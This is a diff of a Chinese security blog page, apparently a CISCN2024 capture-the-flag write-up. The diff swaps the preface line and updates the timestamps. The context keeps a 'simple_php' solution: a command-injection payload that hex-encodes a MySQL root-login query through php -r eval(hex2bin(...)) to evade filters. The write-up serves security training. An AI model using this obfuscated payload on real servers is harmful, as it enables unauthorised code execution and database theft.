@@ -6,12 +6,12 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="前言所有事情看得太清楚，或许不是件好事，我好像变弱了。 simple_php用php -r 执行php代码，用hex2bin绕过关键字和转义。 1cmd&#x3D;php+-r+eval(hex2bin(substr(_6563686f20606d7973716c202d7520726f6f74202d7027726f6f7427202d652027757365205048505f434d533b73686">
+    <meta name="description" content="前言主要复现一下ezjava，jdbc attack还是很有意思的 simple_php用php -r 执行php代码，用hex2bin绕过关键字和转义。 1cmd&#x3D;php+-r+eval(hex2bin(substr(_6563686f20606d7973716c202d7520726f6f74202d7027726f6f7427202d652027757365205048505f434d533">
 <meta property="og:type" content="article">
 <meta property="og:title" content="CISCN2024 writeup">
 <meta property="og:url" content="https://jaspersec.top/2024/05/25/0x11%20CISCN2024%20writeup/index.html">
 <meta property="og:site_name" content="Jasper_sec">
-<meta property="og:description" content="前言所有事情看得太清楚，或许不是件好事，我好像变弱了。 simple_php用php -r 执行php代码，用hex2bin绕过关键字和转义。 1cmd&#x3D;php+-r+eval(hex2bin(substr(_6563686f20606d7973716c202d7520726f6f74202d7027726f6f7427202d652027757365205048505f434d533b73686">
+<meta property="og:description" content="前言主要复现一下ezjava，jdbc attack还是很有意思的 simple_php用php -r 执行php代码，用hex2bin绕过关键字和转义。 1cmd&#x3D;php+-r+eval(hex2bin(substr(_6563686f20606d7973716c202d7520726f6f74202d7027726f6f7427202d652027757365205048505f434d533">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250441957.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250442616.png">
@@ -23,7 +23,7 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250436448.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250430805.png">
 <meta property="article:published_time" content="2024-05-24T20:31:00.000Z">
-<meta property="article:modified_time" content="2024-05-24T20:45:26.643Z">
+<meta property="article:modified_time" content="2024-05-24T20:49:08.843Z">
 <meta property="article:author" content="Jasper_sec">
 <meta property="article:tag" content="Java">
 <meta property="article:tag" content="反序列化">
@@ -154,7 +154,7 @@
       
         <time datetime="2024-05-24T20:31:00.000Z" class="dt-published" itemprop="datePublished">2024-05-25</time>
         
-        (Updated: <time datetime="2024-05-24T20:45:26.643Z" class="dt-updated" itemprop="dateModified">2024-05-25</time>)
+        (Updated: <time datetime="2024-05-24T20:49:08.843Z" class="dt-updated" itemprop="dateModified">2024-05-25</time>)
         
       
     </div>
@@ -174,7 +174,7 @@
   
 
   <div class="content e-content" itemprop="articleBody">
-    <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>所有事情看得太清楚，或许不是件好事，我好像变弱了。</p>
+    <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>主要复现一下ezjava，jdbc attack还是很有意思的</p>
 <h1 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h1><p>用php -r 执行php代码，用hex2bin绕过关键字和转义。</p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=php+-r+eval(hex2bin(substr(_6563686f20606d7973716c202d7520726f6f74202d7027726f6f7427202d652027757365205048505f434d533b73686f77207461626c65733b73656c656374202a2066726f6d20463161675f5365335265373b27603b,1)));</span><br></pre></td></tr></table></figure>
 
